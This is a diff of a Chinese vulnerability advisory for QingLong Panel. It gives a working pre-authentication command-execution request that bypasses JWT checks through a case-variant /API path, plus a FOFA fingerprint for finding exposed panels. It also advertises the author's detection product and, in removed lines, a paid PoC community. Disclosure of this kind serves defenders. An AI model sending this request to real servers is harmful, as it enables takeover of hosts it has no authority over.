@@ -1,25 +1,61 @@
 #  【漏洞预警】青龙面板 网站管理系统 command-run 远程代码执行漏洞  
 by 融云安全-sm
-                    by 融云安全-sm  融云攻防实验室   2026-03-04 03:11  
+                    by 融云安全-sm  融云攻防实验室   2026-03-04 07:17  
   
-**0x01 阅读须知**  
+**漏洞名称：**  
   
-**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！**  
+青龙面板 网站管理系统 command-run 远程代码执行漏洞  
   
-**0x02 漏洞描述**  
+**组件详情：**  
   
-青龙面板是一款基于Web的自动化任务管理与网站资源管理工具，旨在帮助用户高效处理各类定时任务、脚本执行与网站运维工作。‌  
+青龙面板（QingLong Panel）是一款开源的定时任务管理平台，支持 Python3、JavaScript、Shell、TypeScript 等多种脚本语言，用于自动化任务调度、脚本运行、依赖管理、通知推送等功能。广泛应用于 NAS、自建服务器、云主机上的签到、薅羊毛、爬虫、自动化运维等场景，默认端口 5700，基于 Node.js + Express 框架开发，提供 Web 管理界面和 API 接口。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrjwIfKibsIibfI7Pu9ZhARbicE2pH88Miac7Mib60e3d3zqf5IiasC4u71tT0tOHANHn66h114ic2fjt55iaxsustJqlcJzj556Q5ZcOPc/640?wx_fmt=png&from=appmsg "")  
+**影响范围：**  
+- 青龙面板 V2.20.1 及以下版本（包括最新版在内多个主流分支）  
   
-**0x03 漏洞复现**  
+- 涉及 /api/system/command-run 接口的部署实例  
+  
+- 所有公网暴露或未加固的 Docker / 直接部署青龙面板系统  
+  
+- 其他基于青龙面板的二次开发或镜像版本（如某些 NAS 插件）  
+  
+**漏洞类型：**  
+  
+远程代码执行（Remote Code Execution，RCE），结合鉴权绕过（Authentication Bypass）  
+  
+**利用条件：**  
+  
+1、用户认证：无需用户认证（预认证远程利用）  
+  
+2、前置条件：默认配置下面板 Web 服务暴露（端口 5700 开放），Express 路由对大小写不敏感 + URL 重写缺陷  
+  
+3、触发方式：远程（通过大小写变形路径如 /API/system/command-run 绕过 JWT 鉴权，直接 POST 恶意命令到 command-run 接口执行系统命令）  
+  
+**综合评价：**  
+  
+1、用户认证：无需用户认证（预认证远程利用）  
+  
+2、前置条件：默认配置下面板 Web 服务暴露（端口 5700 开放），Express 路由对大小写不敏感 + URL 重写缺陷  
+  
+3、触发方式：远程（通过大小写变形路径如 /API/system/command-run 绕过 JWT 鉴权，直接 POST 恶意命令到 command-run 接口执行系统命令）  
+  
+**官方解决方案：**  
+  
+青龙面板项目官方已知晓该类问题（2026 年 2 月披露），建议立即：  
+  
+升级到最新修复版本  
+  
+  
+  
+**复现情况**  
+  
   
 f  
 ofa  
 ：  
 icon_hash=="-254502902"  
   
-1.上传无害文件访问得到结果  
+1.执行id命令访问得到结果  
 ```
 PUT /API/system/command-run HTTP/1.1
 Host: 
@@ -36,58 +72,25 @@ Upgrade-Insecure-Requests: 1
 {"command": "id"}
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrgqaozCCzzsHIvIATJeKUSxkyt6JTFH7nVboMrV0aTicIjSoNMleiadceE97pLuoRH1mkibV3icpmOePJiavCn9kAtwcvqPuPIF4UWw/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrhcqsO1dvkMibUEws9GA3ep0P9vV42FM5iarYWYyiaBocRZEXaf2J0ia0cV9BsJNWOicpQv6pNqPFicnFHyQCHPG24ia9EjSNvEUk2MbI/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1 "")  
   
 2.渝融云NTM入侵检测系统已支持青龙面板攻击检测  
 （入侵检测合作可私聊公众号）  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrj1NjpibgCQqZh8YmzibFZNmK4fjZtfRSJX7WIgL1rh2qknmSSxPVIFFvsKviciazW1ec074KLWsbvSEt8DibH7r9Qb4JGibFeMJDZh4/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrg7cqKia320QPEuRSVZqIFnlaCIgCwiaLsJJTloiciaqnU8JriblW7aV8FqMNEu3BUWPTibRgSicnwD08rUcwelw2N6H6DW6HtcSibkVdQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2 "")  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zriaLHbWibB6ltjzUHsIWGRGaKQbjic1r6P7oeCFJt4BkFP1g6KpwpyuADXLibIziaG3LVhwCymOOgnVofY9qndLWyH6iav3jdh09Yg8c/640?wx_fmt=png&from=appmsg "")  
-  
-  
-3.nuclei图形化检测工具和poc已公布在星球  
-  
-![](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrh3wFG9rd3bnjDfJgedNd1AQBgJyb5AVwnsKP1KA28ereia9ao1RKVEXdbJHomzzPhCkCCSlZsfUjFRBz1Emql34lahZDGVRnCY/640?wx_fmt=png&from=appmsg "")  
+![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zriaPmoojAcs6kpXD0a7aF6KxP66x1BllbuQqiaWuvlHPSZpG1EqhOzJ376Gv6iaORVxNhsiaYZmRQKYPqDMiboBS5u7MEUeuuqqqSgM/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3 "")  
   
   
-**最后给兄弟们推荐下圈子，高质量漏洞利用研究，代码审计圈子，每周至少更新三个0Day/Nday及对应漏洞的批量利用工具，团队内部POC，源码分享，星球不定时更新内外网攻防渗透技巧以及最新学习，SRC研究报告等。**  
+![图片](https://mmbiz.qpic.cn/mmbiz_gif/w8NHw6tcQ5wicTzaxopgE26TXk6BicVDCkRV2P7zLEqkMiarB6Gq7gwAfxowKPPDGI0iahiaOkO55LooibEGtWxj9Biag/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
   
-**【圈子权益】**  
+**渝融云解决方案-渝融云NTM全流量分析探针**  
   
-**1，一年至少200+漏洞Poc及对应漏洞批量利用工具**  
+**已添加监测规则**  
+，可实时监控  
+青龙面板 网站管理系统 command-run 远程代码执行漏洞  
   
-**2，各种漏洞利用工具及后续更新，渗透工具、文档资源分享**  
+设备简介：渝融云NTM全流量分析探针是一款集流量分析、威胁检测与行为审计于一体的智能化网络流量监测平台。系统通过对网络全流量的实时采集与深度解析，帮助用户实现网络态势的“全景透视”。  
   
-**3，内部漏洞库情报分享（目前已有1000+poc，会每日更新，包括部分未公开0/1day）**  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrgjCibbkmKPIAMud0PoXI7biajGvzcMXE4WUmK6bQ0ttPickjWBWIGGBJ4xvlZowq3ywLhcMx1Zl6XhLpDtNL6B7fe0UGdtYjoSYE/640?wx_fmt=png&from=appmsg "")  
   
-**圈子目前价格为59元，现在星球有1000+位师傅相信并选择加入我们**  
-  
-****  
-****  
-**0x05 公司简介**  
-  
-江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
-  
-   公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......  
-****  
-  
-广告：  
-CNNVD二级和三级申请、续期私聊找我对话，价格便宜童叟无欺！  
-  
-**编制：sm**  
-  
-**审核：fjh**  
-  
-**审核：Dog**  
-  
-****  
-**1个1朵********5毛钱**  
-  
-**天天搬砖的小M**  
-  
-**能不能吃顿好的**  
-  
-**就看你们的啦**  
-  
-****  
